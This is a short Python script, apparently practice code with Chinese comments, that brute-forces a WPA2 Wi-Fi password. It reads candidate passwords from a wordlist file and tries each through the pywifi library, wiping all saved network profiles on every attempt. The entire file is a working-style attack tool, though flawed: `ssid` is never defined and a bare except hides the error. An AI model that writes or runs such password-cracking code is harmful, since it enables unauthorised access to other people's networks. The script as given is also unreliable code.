import os
import pywifi
import time
from pywifi import const

#连接wifi
def wifiConnection(ssid,pwd):
    #获得WiFi接口
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]#获得第一个无限网卡
    iface.disconnect()#断开当前的WiFi连接
    time.sleep(1)
    wifiStatus = iface.status()#获得WiFi的连接状态    
    print('wifiStatus:',wifiStatus)
    #判断连接状态
    if wifiStatus == const.IFACE_DISCONNECTED:
        #wifi未连接 
        #[1]获取wifi链接文件
        #[2]设置要连接的wifi的名称
        #[3]设置网卡的状态为开放
        #[4]设置wifi密码的加密算法
        #[5]设置加密单元
        #[6]设置wifi密码
        #[7]删除所有的WiFi连接文件
        #[8]设定新的连接文件
        #[9]使用新的连接文件测试连接

        profile = pywifi.Profile()
        profile.ssid = ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = pwd
        iface.remove_all_network_profiles()
        tmp_profile = iface.add_network_profile(profile)
        iface.connect(tmp_profile)

        time.sleep(3)#给获取连接和分配ip的时间

        if iface.status() == const.IFACE_CONNECTED:
            #wifi已连接
            return True
        else:
            return False
    else:
        print("已连接")


#读取密码本
def readPassword():
    path=os.path.join(os.path.abspath("."),"py-learn-code","code-codeniu","练习代码","wifi破解","pass.txt")
    myfile = open(path,"r")
    flag = 0
    while True:
        try:
            #读取一行
            passStr = myfile.readline().strip()
            flag = wifiConnection(ssid,passStr)           
            if flag:
                print('密码正确',passStr)                
            else:
                print('密码错误',passStr)  
        except:
            print('***')
            break
    myfile.close()

readPassword()